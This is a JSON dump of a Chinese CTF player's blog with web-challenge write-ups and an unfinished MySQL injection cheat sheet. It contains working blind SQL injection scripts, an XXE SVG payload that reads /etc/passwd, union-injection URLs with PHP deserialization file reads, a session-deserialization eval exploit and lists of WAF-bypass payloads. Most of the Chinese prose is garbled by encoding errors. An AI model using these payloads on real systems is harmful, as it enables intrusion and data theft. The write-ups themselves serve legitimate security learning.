{"meta":{"title":"Tiaonmmn's Littile House","subtitle":null,"description":null,"author":"Tiaonmmn.ZMZ","url":"http://tiaonmmn.github.io","root":"/"},"pages":[{"title":"About Me","date":"2019-05-15T02:43:37.000Z","updated":"2019-09-12T04:55:58.000Z","comments":true,"path":"about/index.html","permalink":"http://tiaonmmn.github.io/about/index.html","excerpt":"","text":"èœé¸¡ä¸€åªï¼Œæ²¡äº‹å¹å¹æ°´ã€‚ And,kibHArn9Ip1uJP8obpr3uQ==,seriouslyã€‚"},{"title":"categories","date":"2019-05-15T02:25:54.000Z","updated":"2019-09-12T04:56:27.000Z","comments":true,"path":"categories/index.html","permalink":"http://tiaonmmn.github.io/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-05-15T02:25:22.000Z","updated":"2019-09-12T04:57:49.000Z","comments":true,"path":"tags/index.html","permalink":"http://tiaonmmn.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Confidence-Final-2020-Haha-jail","slug":"Confidence-Final-2020-Haha-jail","date":"2020-09-13T15:01:03.000Z","updated":"2020-09-13T15:37:31.690Z","comments":true,"path":"2020/09/13/Confidence-Final-2020-Haha-jail/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/13/Confidence-Final-2020-Haha-jail/","excerpt":"","text":"æ¥ä¸€é“ä¸æ˜¯BUUOJä¸Šçš„é¢˜ï¼ŒConfidence CTF Final 2020çš„Haha_jailã€‚ è¿™é¢˜æœ‰ç‚¹éº»çƒ¦ï¼Œæ²¡æ³•åšDockerç¯å¢ƒï¼ˆè¿˜æ˜¯æˆ‘å¤ªèœï¼Œéº»çƒ¦æœ‰æˆåŠŸçš„å¸ˆå‚…è´¡çŒ®ä¸€ä¸‹Dockeré•œåƒï¼‰ è¿™é¢˜ç»™äº†ä¸¤ä¸ªæ–‡ä»¶ï¼Œ flag{0980700f-0a4d-45be-a1b2-ec02e8f1a6e4}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Hack","slug":"Hack","permalink":"http://tiaonmmn.github.io/tags/Hack/"},{"name":"RCE","slug":"RCE","permalink":"http://tiaonmmn.github.io/tags/RCE/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Hack-World","slug":"BUUOJåˆ·é¢˜-Web-Hack-World","date":"2020-09-09T09:21:55.000Z","updated":"2020-09-21T08:08:47.072Z","comments":true,"path":"2020/09/09/BUUOJåˆ·é¢˜-Web-Hack-World/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/09/BUUOJ%E5%88%B7%E9%A2%98-Web-Hack-World/","excerpt":"","text":"å¾ˆæ˜æ˜¾ï¼Œselect flag from flagï¼Œç„¶åè¿‡æ»¤äº†ä¸€å †ä¸œè¥¿ï¼Œå‘ç°æ²¡æœ‰è¿‡æ»¤^ï¼Œå¼‚æˆ–æ³¨å…¥ã€‚ 12345678910111213import requestsurl=&quot;http://e9104091-792d-476b-8ba6-d151cc2204fe.node3.buuoj.cn/index.php&quot;flag=&quot;&quot;for a in range(17,127): for b in range(32,127): x=requests.post(url,data=&#123; &quot;id&quot;:&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;.format(a,b) &#125;) print(&quot;1^(ascii(substring((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)^0&quot;.format(a,b)) if &quot;Hello, glzjin wants a girlfriend.&quot; in x.text: flag+=chr(b) print(flag) break flag{2af40d57-a06b-4621-aef6-6b4ef6a5be7c}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"BUUOJåˆ·é¢˜-Web-EasyJava","slug":"BUUOJåˆ·é¢˜-Web-EasyJava","date":"2020-09-04T09:09:42.000Z","updated":"2020-09-04T09:09:42.829Z","comments":true,"path":"2020/09/04/BUUOJåˆ·é¢˜-Web-EasyJava/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/04/BUUOJ%E5%88%B7%E9%A2%98-Web-EasyJava/","excerpt":"","text":"flag{d9d1cc00-1b71-4b22-bd07-0137edb623a1}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[]},{"title":"BUUOJåˆ·é¢˜-Web-SVGMagic","slug":"BUUOJåˆ·é¢˜-Web-SVGMagic","date":"2020-09-03T09:38:33.000Z","updated":"2020-09-03T10:31:03.948Z","comments":true,"path":"2020/09/03/BUUOJåˆ·é¢˜-Web-SVGMagic/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/03/BUUOJ%E5%88%B7%E9%A2%98-Web-SVGMagic/","excerpt":"","text":"BSidesCTF 2019çš„SVGMagicã€‚å¼€é¢˜è®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ å…¶ä»–æ–‡ä»¶æŠ¥500ï¼Œä¸Šä¼ SVGä¼šæˆåŠŸæ¸²æŸ“ï¼Œå¹¶æ˜¾ç¤ºPNGæ¸²æŸ“ç»“æœã€‚ SVGå®é™…ä¸Šæ˜¯ä¸€ä¸ªXMLæ–‡æ¡£ã€‚å› æ­¤å¯èƒ½å‡ºç°XXEé—®é¢˜ã€‚æˆ‘ä»¬è¯•ä¸€ä¸‹ã€‚ç¿»å‚è€ƒæ–‡æ¡£SVGæ ‡ç­¾ä¸­èƒ½æ’å…¥å…ƒç´ çš„æœ‰&lt;text&gt;ï¼Œæ‰€ä»¥ç›´æ¥å†™ä¸€ä¸ªè¿›å»ï¼š 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;svg width=&quot;512px&quot; height=&quot;190px&quot; viewBox=&quot;0 0 512 190&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; preserveAspectRatio=&quot;xMidYMid&quot;&gt; &lt;g&gt; &lt;text x=&quot;0&quot; y=&quot;15&quot; fill=&quot;red&quot;&gt;&amp;xxe;&lt;/text&gt; &lt;/g&gt;&lt;/svg&gt; ä¸Šä¼ çœ‹PNGå›¾ç‰‡å³å¯å¾—åˆ°å†…å®¹ã€‚ä¸‹ä¸€æ­¥æ˜¯æ‹¿flagã€‚è¿™é¢˜å½“æ—¶ç¯å¢ƒæ˜¯è®©æˆ‘ä»¬æ‹¿flag.txtï¼Œä½†æ˜¯ä½ç½®ä¸çŸ¥é“ã€‚æ‰€ä»¥ç›²æµ‹ã€‚æ‰¾äº†ä¸€åœˆï¼Œæœ€åçŒœæ˜¯åœ¨ç¨‹åºæ ¹ç›®å½•ä¸‹ï¼Œfile:///proc/self/cwd/flag.txtã€‚ flag{f189ef14-aaaa-429d-88eb-08c721bbedff}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"XXE","slug":"XXE","permalink":"http://tiaonmmn.github.io/tags/XXE/"},{"name":"SVG","slug":"SVG","permalink":"http://tiaonmmn.github.io/tags/SVG/"}]},{"title":"BUUOJåˆ·é¢˜-Web-Fakebook","slug":"BUUOJåˆ·é¢˜-Web-Fakebook","date":"2020-09-02T03:29:03.000Z","updated":"2020-09-02T08:08:50.200Z","comments":true,"path":"2020/09/02/BUUOJåˆ·é¢˜-Web-Fakebook/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/","excerpt":"","text":"2018ç½‘é¼æ¯çš„Fakebookã€‚ ä¸Šæ¥å…è®¸Loginå’ŒJoinï¼ŒJoinä¼šè®©æˆ‘ä»¬è¾“å…¥ç”¨æˆ·åã€å¯†ç ã€å¹´é¾„å’Œåšå®¢ï¼Œè¾“å…¥è¿™ä¸ªä¸œè¥¿æœ‰ç‚¹æ„æ€ã€‚ä¸èƒ½ä»¥httpå¼€å¤´ï¼Œä¸èƒ½å‡ºç°127.0.0.1ï¼Œéšä¾¿è¾“å…¥www.baidu.comï¼Œé€šè¿‡ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡view.php?no=1æ¥å¾—åˆ°è¯¦ç»†ä¿¡æ¯ï¼Œä»¥åŠBlogçš„å†…å®¹ã€‚SSRFæ²¡è·‘äº†ã€‚ æ‰«æºç ï¼Œå‘ç°æœ‰robots.txtï¼Œuser.php.bakï¼Œä¸‹è½½å¾—æºç ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass UserInfo&#123; public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; &#125; function get($url) &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); &#125;&#125; isValidBlogé™åˆ¶æœ‰ç‚¹ä¸¥ï¼Œåªå…è®¸http(s)åè®®ï¼Œè¦æƒ³åŠæ³•å˜æˆgopheræˆ–è€…fileåè®®ã€‚ æ³¨æ„åˆ°view.php?no=1ï¼Œéšæ‰‹åŠ ä¸ªå•å¼•å·ï¼Œå‘ç°MySQLæŠ¥é”™ï¼Ÿunion selectè¢«Banï¼Œé‚£å°±ç”¨æ³¨é‡Šç»•è¿‡ï¼Œç„¶åæ‰‹æ³¨ã€‚http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,database(),3,4%23ï¼Œå¾—åˆ°å½“å‰æ•°æ®åº“ä¸ºfakebookï¼Œ[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27%20limit%201),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select table_name from information_schema.tables where table_schema='fakebook' limit 1),3,4%23)ï¼Œå½“å‰è¡¨åä¸ºusersï¼Œ[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20limit%201,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select column_name from information_schema.columns where table_schema='fakebook' limit 1,1),3,4%23)ï¼Œå¾—åˆ°usersè¡¨å­—æ®µä¸ºï¼šnoã€usernameã€passwdã€dataã€‚[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20data%20from%20users%20limit%200,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select data from users limit 0,1),3,4%23)å¾—åˆ°dataçš„å†…å®¹ï¼Œè¿”å›O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:13:\"www.baidu.com\";&#125;ï¼Œååºåˆ—åŒ–ä¸²å†…å®¹æ­£å¥½å¯¹åº”user.php.baké‡Œçš„UserInfoç±»ã€‚ é‚£ä¹ˆï¼ŒçŒœæµ‹ä¸€ä¸‹view.phpçš„é€»è¾‘ï¼Œä»æ•°æ®åº“è·å–å¯¹åº”noçš„è¡Œï¼Œç„¶åååºåˆ—åŒ–dataï¼Œå¹¶æ˜¾ç¤ºåˆ°é¡µé¢ä¸Šå»ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚æœæˆ‘ä»¬ä¿®æ”¹äº†ååºåˆ—åŒ–ä¸²ï¼Œå°±å¯ä»¥ä½¿å¾—blogçš„åœ°å€ä¸å—isValidBlog()çš„é™åˆ¶ã€‚ éšæ‰‹æµ‹ä¸€ä¸‹flag.phpï¼Œå‘ç°å­˜åœ¨ã€‚é‚£ä¹ˆfile://è¯»å°±å¯ä»¥äº†ã€‚æ„é€ ååºåˆ—åŒ–ä¸²O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;ï¼Œç„¶åè®¿é—®http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(2),3,'O:8:\"UserInfo\":3:&#123;s:4:\"name\";s:3:\"123\";s:3:\"age\";i:123;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";&#125;'%23ï¼Œå³å¯å¾—åˆ°flag.phpå†…å®¹ã€‚ flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"}]},{"title":"JarvisOJ-PHPINFO","slug":"JarvisOJ-PHPINFO","date":"2020-09-01T14:05:23.000Z","updated":"2020-09-02T02:54:24.493Z","comments":true,"path":"2020/09/01/JarvisOJ-PHPINFO/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/01/JarvisOJ-PHPINFO/","excerpt":"","text":"JarvisOJçš„PHPINFOï¼ŒSessionååºåˆ—åŒ–é¢˜ã€‚ ç»™äº†æºç ï¼š 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; ä¼ ä¸ªphpinfoå‚æ•°å°±èƒ½çœ‹phpinfoäº†ï¼ŒPHP 5.6.21ç‰ˆæœ¬ã€‚ ç»™äº†ä¸ªç±»OowoOï¼Œå¯ä»¥eval()ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•å¯ååºåˆ—åŒ–çš„åœ°æ–¹ã€‚ç„¶åå¼€å¤´çš„è®¾ç½®session.serialize_handlerå¾ˆå¥‡æ€ªï¼Œå¹¶ä¸”è°ƒäº†session_start()ï¼Œåˆæ²¡æœ‰ç”¨åˆ°$_SESSIONï¼Œåº”è¯¥æ˜¯SESSIONçš„é—®é¢˜äº†ã€‚æŸ¥äº†ä¸€ä¸‹session.serialize_handlerï¼Œå‚è€ƒè¿™ä¸ªï¼Œä¸»è¦é—®é¢˜æ˜¯session.serialize_handlerä¸ºphpæ—¶ä¼šä»¥|åˆ†å‰²SESSIONé¡¹ï¼Œåæ¥åºåˆ—åŒ–å†…å®¹ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†æŸäº›å†…å®¹ï¼ˆä¾‹å¦‚å˜é‡ï¼‰æˆªæ–­åæ·»åŠ |ï¼Œæ‰‹åŠ¨æ·»åŠ æˆ‘ä»¬å¯æ§çš„åºåˆ—åŒ–å†…å®¹ã€‚å¹¶ä¸”æ³¨æ„åˆ°phpinfoä¸­serssion.serialize_handlerçš„Master Valueå’ŒLocal Valueä¸åŒã€‚PHPä¸­Sessionçš„å¤„ç†æ˜¯åœ¨è„šæœ¬å®é™…æ‰§è¡Œä¹‹å‰çš„ï¼Œå› æ­¤è¯·æ±‚ä¹‹å‰Session.serizlize_handleræ˜¯ä»¥php_serializeæ–¹å¼è¿è¡Œçš„ã€‚è¿™å°±é€ æˆäº†æˆ‘ä»¬æ˜¯ä»¥ä¸¤ç§ä¸åŒçš„phpåºåˆ—åŒ–æ–¹å¼è¿è¡Œï¼Œå¾ˆå®¹æ˜“é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ ç„¶åå›åˆ°è¿™é“é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè¾“å…¥ç‚¹ã€‚å›è¿‡å¤´ç¿»PHPæ–‡æ¡£ï¼Œæ‰¾SESSIONçš„ä¸œè¥¿ï¼Œè¿˜çœŸæœ‰è¿™é‡Œå’Œè¿™é‡Œï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¦‚æœæ‰“å¼€äº†session.upload_progress.enabledï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡formè¡¨å•æäº¤ä¸€ä¸ªå˜é‡åˆ°SESSIONé‡Œå»ã€‚è¿™ä¸ªå˜é‡åé€šè¿‡phpinfoçš„session.upload_progress.nameæŸ¥çœ‹ã€‚ æ ¹æ®ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥ç…§ç€ä¸Šä¼ upload progresså˜é‡ï¼š 123456&lt;form action=&quot;upload.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; éšä¾¿ä¸Šä¼ ï¼Œç„¶åæŠ“åŒ…ã€‚æˆ‘ä»¬çš„æ”»å‡»ç‚¹åœ¨äºfileçš„nameï¼Œå°†å…¶ä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„ååºåˆ—åŒ–å€¼å³å¯ã€‚ 1234567&lt;?phpclass OowoO&#123; public $mdzz=&quot;var_dump(scandir(chr(46)));&quot;;&#125;echo serialize(new OowoO());?&gt; å¾—åˆ°O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"var_dump(scandir(chr(46)));\";&#125;ï¼Œæ³¨æ„$mdzzå­—ç¬¦ä¸²æœ€åä¸€å®šè¦æœ‰ä¸€ä¸ª;ï¼ˆevalï¼‰ã€‚ç„¶åç”±äºrequestsçš„zzæ“ä½œï¼Œæˆ‘ä»¬è¦æ‰‹åŠ¨æ”¹åŒ…ï¼š é¦–å…ˆï¼Œè¦ä»¥|å¼€å¤´ï¼Œè¿™æ˜¯phpåºåˆ—åŒ–å™¨çš„æ ‡å¿—ã€‚ç„¶åæ‰€æœ‰çš„åŒå¼•å·éƒ½è¦è½¬ä¹‰ï¼Œå†™Sessionçš„æ—¶å€™ç›´æ¥åŸæ ·è¯»å–Content-Dispositionçš„filenameï¼Œå¦‚æœä¸è½¬ä¹‰ï¼Œç”±äºæˆ‘ä»¬è¦å†™å…¥åŒå¼•å·ï¼Œä¼šé€ æˆSessionåºåˆ—åŒ–çš„æˆªæ–­ã€‚ æäº¤å°±å¯ä»¥åˆ—ç›®å½•äº†ã€‚ç„¶åè¯»æ–‡ä»¶å³å¯ï¼Œè¦æ³¨æ„disable_functionså’ŒæœåŠ¡å™¨ä¸Šæ–‡ä»¶è·¯å¾„ã€‚ flag{572ebfac-535f-46f2-873e-f7cc8bc1ecf3}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Unserialize","slug":"Unserialize","permalink":"http://tiaonmmn.github.io/tags/Unserialize/"},{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Session","slug":"Session","permalink":"http://tiaonmmn.github.io/tags/Session/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-09-01T13:10:06.501Z","updated":"2019-12-10T12:15:12.664Z","comments":true,"path":"2020/09/01/hello-world/","link":"","permalink":"http://tiaonmmn.github.io/2020/09/01/hello-world/","excerpt":"","text":"ç¡¬ç›˜åäº†ï¼Œåšå®¢æºç éƒ½ä¸¢äº†ã€‚æ…¢æ…¢è¡¥å§ï¼Œæ¯•ä¸šäº†ï¼Œå°½é‡æŠ½æ—¶é—´å†™åšå®¢äº†ã€‚ P.S. æœ¬åšå®¢æ‰€æ¶‰åŠé¢˜ç›®å…¨éƒ¨å¯åœ¨https://github.com/Tiaonmmnä¸­æ‰¾åˆ°ã€‚ flag{60afaee8-fee2-4658-bff5-80ee990fd612}","categories":[],"tags":[]},{"title":"BUUOJåˆ·é¢˜-Web-ç®€å•æ³¨å…¥","slug":"BUUOJåˆ·é¢˜-Web-ç®€å•æ³¨å…¥","date":"2020-08-25T10:21:01.000Z","updated":"2020-08-26T09:32:17.060Z","comments":true,"path":"2020/08/25/BUUOJåˆ·é¢˜-Web-ç®€å•æ³¨å…¥/","link":"","permalink":"http://tiaonmmn.github.io/2020/08/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5/","excerpt":"","text":"BJDCTF 2ndçš„ç®€å•æ³¨å…¥ã€‚ æ˜æ˜¾æ³¨å…¥é¢˜ã€‚ robots.txtå‘ç°æœ‰hint.txtï¼Œhint.txté‡Œç»™å‡ºæŸ¥è¯¢è¯­å¥select * from users where username='$_POST[\"username\"]' and password='$_POST[\"password\"]';ï¼Œå¹¶ä¸”å‘Šè¯‰æˆ‘ä»¬è¦å¾—åˆ°å¯†ç ã€‚ è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼ŒåŒ…æ‹¬select and &amp; \" ' = - ã€‚ ç„¶åä»‹ç»ä¸€ç§æ–°çš„Payloadï¼Œå¦‚æœæˆ‘ä»¬ç»™usernameä¼ admin\\ä¼šæ€æ ·ï¼Ÿselect * from users where username='admin\\' and password='safasfd'ã€‚\\è½¬ä¹‰ç¬¦å·ä¼šåƒæ‰ä¸€ä¸ªå•å¼•å·ï¼Œå¯¼è‡´usernameå®é™…ä¸Šç­‰äºadmin' and password=ï¼Œæˆ‘ä»¬å°±é€ƒé€¸å‡ºä¸€ä¸ªå•å¼•å·ã€‚ç„¶åç›²æ³¨å¥½äº†ã€‚ å¾ˆæ˜ç¡®ï¼Œè¦select password from usersã€‚é‚£å°±å¾ˆç®€å•äº†ï¼Œpasswordæ„é€ or ascii(substr((password),1,1))&gt;32ï¼Œï¼Œç›²æ³¨è·‘è„šæœ¬å³å¯ã€‚ 123456789101112131415import requestsurl=&quot;http://06f46304-b570-4801-aa2d-6641e91f487b.node3.buuoj.cn/&quot;flag=&quot;&quot;for a in range(1,64): for b in range(32,128): c=requests.post(url=url,data=&#123; &quot;username&quot;:&quot;admin\\\\&quot;, &quot;password&quot;:&quot; or ascii(substring(password,&#123;&#125;,1))&gt;&#123;&#125;#&quot;.format(a,b) &#125;) if &quot;stronger&quot; not in c.text: flag+=chr(b) print(flag) break flag{d4131ee5-def8-4c8b-9778-1bab77190f59}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://tiaonmmn.github.io/tags/PHP/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://tiaonmmn.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"MySQLæ³¨å…¥æ€»ç»“","slug":"MySQLæ³¨å…¥æ€»ç»“","date":"2020-08-24T07:58:59.000Z","updated":"2020-09-09T09:07:16.178Z","comments":true,"path":"2020/08/24/MySQLæ³¨å…¥æ€»ç»“/","link":"","permalink":"http://tiaonmmn.github.io/2020/08/24/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","excerpt":"","text":"or andè¢«è¿‡æ»¤ ç”¨|| &amp;&amp;ä»£æ›¿ union select è¢«è¿‡æ»¤ ç”¨/*!union*/ /*!select*/ä»£æ›¿ ç©ºæ ¼è¢«è¿‡æ»¤ ç”¨/%0a/ï¼Œæˆ–è€…()ã€‚ é€—å·è¢«è¿‡æ»¤ ifæ¢æˆselect case whenï¼Œsubstringæ”¹ç”¨substring( from 1 for 1) æŠ¥é”™æ³¨å…¥ 1.floor() select * from test where id=1 and (select 1 from (select count(),concat(user(),floor(rand(0)2))x from information_schema.tables group by x)a); img 2.extractvalue() select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e))); img 3.updatexml() select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); img 4.geometrycollection() select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b)); img 5.multipoint() select * from test where id=1 and multipoint((select * from(select * from(select user())a)b)); img 6.polygon() select * from test where id=1 and polygon((select * from(select * from(select user())a)b)); img 7.multipolygon() select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b)); img 8.linestring() select * from test where id=1 and linestring((select * from(select * from(select user())a)b)); img 9.multilinestring() select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b)); img 10.exp() select * from test where id=1 and exp(~(select * from(select user())a)); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071PHP filter code: preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id);Bypass: 1||1 1&amp;&amp;1PHP filter code: preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;, $id);Payload: union select user, password from usersBypass: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;, $id)Payload: 1 || (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;Bypass: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit)&#x2F;i&#39;, $id)Payload: 1 || (select user from users limit 1) &#x3D; &#39;admin&#39;Bypass: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by)&#x2F;i&#39;, $id)Payload: 1 || (select user from users group by user_id having user_id&#x3D;1) &#x3D; &#39;admin&#39;Bypass: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select)&#x2F;i&#39;, $id)Payload: 1 || (select substr(group_concat(user_id),1,1) user from users) &#x3D; 1Bypass: 1 || 1&#x3D;1 into outfile &#39;result.txt&#39;Bypass: 1 || substr(user,1,1)&#x3D;&#39;a&#39;PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;)&#x2F;i&#39;, $id)Payload: 1 || (select substr(gruop_concat(user_id),1,1) user from users) &#x3D; 1Bypass: 1 || user_id is not nullBypass: 1 || substr(user,1,1) &#x3D; 0x61Bypass: 1 || substr(user,1,1) &#x3D; unhex(61)PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex)&#x2F;i&#39;, $id)Payload: 1 || substr(user,1,1) &#x3D; unhex(61)Bypass: 1 || substr(user,1,1) &#x3D; lower(conv(10,10,36))PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr)&#x2F;i&#39;, $id)Payload: 1 || substr(user,1,1) &#x3D; lower(conv(11,10,36))Bypass: 1 || lpad(user,7,1)PHP filter code: preg_match(&#39;&#x2F;(and|or|union|where|limit|group by|select|\\&#39;|hex|substr|\\s)&#x2F;i&#39;, $id)Payload: 1 || lpad(user, 7, 1)Bypass: 1%0b||%0blpad(user,7,1)Bypass with commentsid&#x3D;1+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+1,2,3-- Bypass Regex Filter: &#x2F;union\\sselect&#x2F;g1+UnIon&#x2F;**&#x2F;SeLecT&#x2F;**&#x2F;1,2,3-- Bypass preg_replace1+UNunionION+SEselectLECT+1,2,3--If WAF use preg_replace to replace SQL keywords to whitespace1+uni%0bon+se%0blect+1,2,3--For Mod_rewrite, &#x2F;**&#x2F; cannot bypassed. So we use %0b replace &#x2F;**&#x2F;Double encode can bypass some waf1%252f%252a*&#x2F;union%252f%252a 